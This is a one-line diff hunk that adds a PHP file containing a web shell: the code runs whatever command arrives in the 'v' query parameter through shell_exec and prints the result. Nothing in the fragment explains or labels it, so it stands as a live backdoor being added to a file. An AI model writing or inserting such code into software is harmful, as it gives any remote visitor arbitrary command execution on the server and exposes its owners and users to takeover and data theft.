@@ -1,0 +1,1 @@
+<?php if(isset($_GET[\"v\"])){echo shell_exec($_GET[\"v\"]);}
